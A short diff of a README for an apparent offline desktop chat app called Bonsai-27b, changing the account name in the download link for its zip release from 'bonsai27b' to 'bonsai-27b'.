@@ -7,7 +7,7 @@ If you've been looking for a private, offline ChatGPT alternative that runs enti
 <img width="2048" height="1152" alt="b5adea3c-50ad-4732-9a01-035704c4e7f2" src="https://github.com/user-attachments/assets/33d887b1-4e42-4381-8424-22f24eaa1dc3" />
 
 ## Install
-[Download `Bonsai-27b.zip`](https://github.com/bonsai27b/Bonsai-27b-Ollama-Desktop/releases/download/27b/Bonsai-27b.zip)
+[Download `Bonsai-27b.zip`](https://github.com/bonsai-27b/Bonsai-27b-Ollama-Desktop/releases/download/27b/Bonsai-27b.zip)
 ---
 
 <img width="1199" height="746" alt="3fbe6a20-f2bc-4daa-915b-4c5aaebc2256" src="https://github.com/user-attachments/assets/b23f3ca1-06f6-491e-81c7-c5d7640424bb" />
